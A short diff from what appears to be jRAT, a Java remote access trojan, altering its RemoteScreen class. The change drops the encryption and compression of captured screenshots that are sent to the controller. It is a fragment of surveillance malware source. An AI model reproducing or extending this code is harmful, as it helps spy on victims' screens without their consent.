@@ -10,8 +10,6 @@ import java.awt.Toolkit;
 import java.awt.image.BufferedImage;
 import java.io.DataOutputStream;
 
-import pro.jrat.common.compress.GZip;
-import pro.jrat.common.crypto.Crypto;
 import pro.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
 import pro.jrat.stub.packets.outgoing.Packet17RemoteScreen;
 import pro.jrat.stub.packets.outgoing.Packet18OneRemoteScreen;
@@ -96,7 +94,7 @@ public class RemoteScreen {
 	                gr.dispose();  
 	                
 	                byte[] buffer = ImageUtils.encodeImage(i, q);
-	                buffer = GZip.compress(Crypto.encrypt(buffer, Main.getKey()));
+	                //buffer = GZip.compress(Crypto.encrypt(buffer, Main.getKey()));
 	                
 	                boolean doit = false;
 	                
